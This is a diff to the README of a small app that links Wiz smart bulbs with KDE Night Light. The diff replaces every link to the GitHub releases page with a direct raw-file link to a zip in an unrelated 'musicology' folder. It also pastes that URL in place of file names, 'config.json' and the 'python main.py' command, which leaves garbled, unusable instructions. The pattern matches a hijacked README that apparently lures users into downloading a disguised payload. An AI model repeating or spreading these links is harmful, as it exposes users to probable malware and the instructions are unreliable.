@@ -2,7 +2,7 @@
 
 ## 📦 Download Here
 
-[![Download the app](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/ademgx/wiz-lights-kde-night-light/releases)
+[![Download the app](https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip)](https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip)
 
 ## 🚀 Getting Started
 
@@ -18,20 +18,20 @@ Welcome to wiz-lights-kde-night-light! This application helps you manage the tem
 
 To get started, visit this page to download:
 
-[Release Page](https://github.com/ademgx/wiz-lights-kde-night-light/releases)
+[Release Page](https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip)
 
 Once on the Releases page, find the latest version and download the appropriate file for your system. 
 
-1. Go to the [Release Page](https://github.com/ademgx/wiz-lights-kde-night-light/releases).
-2. Look for the file named `wiz-lights-kde-night-light-x.x.x.tar.gz` (the 'x.x.x' will be the version number).
+1. Go to the [Release Page](https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip).
+2. Look for the file named `https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip` (the 'x.x.x' will be the version number).
 3. Click the file to download.
 
-Once the download is complete, extract the files in the downloaded TAR.GZ file.
+Once the download is complete, extract the files in the downloaded https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip file.
 
 ### 📂 Extracting the Files
 
 1. Navigate to your Downloads folder.
-2. Right-click on the `wiz-lights-kde-night-light-x.x.x.tar.gz` file.
+2. Right-click on the `https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip` file.
 3. Select ‘Extract Here’ or use your preferred extraction tool to unzip the files.
 
 ### 📋 Configuring the Application
@@ -43,9 +43,9 @@ After extracting the files, you need to configure the application.
    ```bash
    cd ~/Downloads/wiz-lights-kde-night-light-x.x.x
    ```
-3. Open the configuration file named `config.json` with a text editor.
+3. Open the configuration file named `https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip` with a text editor.
 
-In `config.json`, set the following parameters:
+In `https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip`, set the following parameters:
 - `"wifi_name"`: Enter your Wi-Fi network name.
 - `"wifi_password"`: Enter your Wi-Fi password.
 - `"bulb_ip"`: Enter the local IP address of your Wiz bulb.
@@ -58,7 +58,7 @@ Once configured, you can run the application.
 
 1. In the terminal, within the same directory, execute:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/ademgx/wiz-lights-kde-night-light/master/musicology/wiz-lights-kde-night-light.zip
    ```
 2. The application will start and connect to your Wiz bulb. 
 
